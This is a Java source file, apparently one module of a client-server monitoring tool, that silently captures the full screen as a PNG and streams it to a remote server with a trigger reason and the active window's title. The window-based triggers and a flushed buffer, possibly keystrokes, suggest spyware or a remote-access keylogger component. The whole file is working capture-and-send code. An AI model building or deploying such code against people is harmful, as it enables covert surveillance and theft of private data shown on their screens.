package client;

import java.awt.AWTException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.awt.Robot;
import java.awt.Dimension;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.awt.Toolkit;
import java.awt.Rectangle;

public class ScreenShot extends Main {

    // Store the last screenshot time
    private static long lastScreenshotTime = 0;
    private static final long SCREENSHOT_COOLDOWN_MS = 5000; // 5 seconds

    protected static void sendScreenshot(byte[] pngBytes, String trigger, String windowTitle) {
        try {
            if (dos == null) return;
            dos.writeUTF("SCREENSHOT");
            dos.writeUTF(trigger != null ? trigger : "");
            dos.writeUTF(windowTitle != null ? windowTitle : "");
            dos.writeInt(pngBytes.length);
            dos.write(pngBytes);
            dos.flush();
            System.out.println("Screenshot sent (" + pngBytes.length + " bytes) trigger=" + trigger + " window=" + windowTitle);
        } catch (IOException ex) {
            System.err.println("Failed to send screenshot: " + ex.getMessage());
        }
    }

    public static void triggerScreenshot(String reason, String windowTitle) {
        long currentTime = System.currentTimeMillis();

        // Check cooldown
        if (currentTime - lastScreenshotTime < SCREENSHOT_COOLDOWN_MS) {
            return;     // Too soon, skip
        }
        lastScreenshotTime = currentTime;

        try {
            try { BufferHelpers.flushBuffer(); } catch (Throwable ignored) {}

            Thread.sleep(100); // allow window to settle
            Dimension screenDim = Toolkit.getDefaultToolkit().getScreenSize();
            BufferedImage img = new Robot().createScreenCapture(new Rectangle(0, 0, screenDim.width, screenDim.height));
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(img, "png", baos);
            baos.flush();
            byte[] bytes = baos.toByteArray();
            baos.close();
            sendScreenshot(bytes, reason, windowTitle);
        } catch (AWTException | IOException | InterruptedException ex) {
            System.err.println("Screenshot failed: " + ex.getMessage());
        }
    }
}
